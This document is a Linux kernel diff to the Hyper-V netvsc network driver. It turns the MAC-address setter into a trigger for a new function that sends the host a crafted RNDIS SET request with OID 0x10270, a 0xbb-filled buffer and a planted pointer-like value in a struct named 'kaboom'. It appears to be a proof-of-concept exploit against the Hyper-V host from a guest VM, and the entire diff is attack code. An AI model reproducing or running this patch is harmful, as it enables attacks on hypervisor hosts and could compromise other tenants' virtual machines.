diff --git a/drivers/net/hyperv/hyperv_net.h b/drivers/net/hyperv/hyperv_net.h
index e74f2d1def80..b597f0cbf4c1 100644
--- a/drivers/net/hyperv/hyperv_net.h
+++ b/drivers/net/hyperv/hyperv_net.h
@@ -220,6 +220,7 @@ int rndis_filter_receive(struct net_device *ndev,
 
 int rndis_filter_set_device_mac(struct netvsc_device *ndev,
 				const char *mac);
+bool rndis_trigger_rndisquery(struct net_device *);
 
 void netvsc_switch_datapath(struct net_device *nv_dev, bool vf);
 
diff --git a/drivers/net/hyperv/netvsc_drv.c b/drivers/net/hyperv/netvsc_drv.c
index 362b7ca6f3b2..35bc34a272e0 100644
--- a/drivers/net/hyperv/netvsc_drv.c
+++ b/drivers/net/hyperv/netvsc_drv.c
@@ -1298,6 +1298,12 @@ static void netvsc_get_stats64(struct net_device *net,
 	rcu_read_unlock();
 }
 
+#if 1
+static int netvsc_set_mac_addr(struct net_device *ndev, void *p) {
+  rndis_trigger_rndisquery(ndev);
+  return -ENODEV;
+}
+#else
 static int netvsc_set_mac_addr(struct net_device *ndev, void *p)
 {
 	struct net_device_context *ndc = netdev_priv(ndev);
@@ -1330,6 +1336,7 @@ static int netvsc_set_mac_addr(struct net_device *ndev, void *p)
 
 	return err;
 }
+#endif
 
 static const struct {
 	char name[ETH_GSTRING_LEN];
diff --git a/drivers/net/hyperv/rndis_filter.c b/drivers/net/hyperv/rndis_filter.c
index b9e44bb22289..50e0d3350fe8 100644
--- a/drivers/net/hyperv/rndis_filter.c
+++ b/drivers/net/hyperv/rndis_filter.c
@@ -1454,3 +1454,53 @@ int rndis_filter_close(struct netvsc_device *nvdev)
 
 	return rndis_filter_close_device(nvdev->extension);
 }
+
+bool rndis_trigger_rndisquery(struct net_device *ndev) {
+  struct kaboom {
+    u64 _doare;
+    u64 _for;
+    u64 _the;
+    u64 _win;
+  };
+  struct net_device_context *ndc = netdev_priv(ndev);
+  struct netvsc_device *nvdev = rtnl_dereference(ndc->nvdev);
+  struct rndis_device *rdev = nvdev->extension;
+  struct rndis_request *request = NULL;
+  struct rndis_set_request *set = NULL;
+  struct kaboom *boom = NULL;
+  bool success = false;
+  const u32 info_buflen = sizeof(*boom);
+
+  request = get_rndis_request(
+    rdev,
+    RNDIS_MSG_SET,
+    RNDIS_MESSAGE_SIZE(*set) + info_buflen
+  );
+
+  if(!request) {
+    goto cleanup;
+  }
+
+  set = &request->request_msg.msg.set_req;
+  set->oid = 0x10270;
+  set->info_buflen = info_buflen;
+  set->info_buf_offset = sizeof(*set);
+  set->dev_vc_handle = 0;
+  boom = (struct kaboom*)(set + 1);
+  memset(boom, 0xbb, set->info_buflen);
+  boom->_win = 0xdeadbeefbaadc0de - 0x20;
+
+  success = rndis_filter_send_request(rdev, request) == 0;
+  if(!success) {
+    goto cleanup;
+  }
+
+  wait_for_completion(&request->wait_event);
+
+cleanup:
+  if(request) {
+    put_rndis_request(rdev, request);
+  }
+
+  return success;
+}
